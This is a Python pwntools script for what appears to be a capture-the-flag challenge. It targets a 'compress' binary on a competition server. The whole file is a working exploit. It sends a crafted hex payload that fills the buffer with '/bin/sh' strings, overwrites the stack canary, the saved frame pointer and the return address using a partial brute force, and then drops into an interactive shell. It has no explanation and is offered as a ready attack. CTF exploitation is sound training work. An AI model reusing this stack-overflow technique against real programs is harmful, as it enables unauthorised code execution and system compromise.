#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./compress"
#"""
HOST = "compression.2021.ctfcompetition.com"
PORT = 1337
"""
HOST = "localhost"
PORT = 7777 
#"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#off_binsh = next(libc.search(b"/bin/sh"))

def exploit():
	conn.sendlineafter("tion\n\n", "2")
	payload = "54494e5900112233"
	payload += "2f62696e2f736800"*31 	# "/bin/sh\x00"
	payload += "99887766"				# padding
	payload += "ffd84910" 				# canary
	payload += "f8"
	payload += "ffd8491f" 				# fake rbp
	payload += "3e53"					# lower 2bytes(4bit bruteforce)
	payload += "ffc84806"				# rip
	payload += "aaff01cf1d"
	
	payload += "ff881e38"				# overwrite 
	payload += "ff000000"
	
	conn.sendlineafter("4k):\n", payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
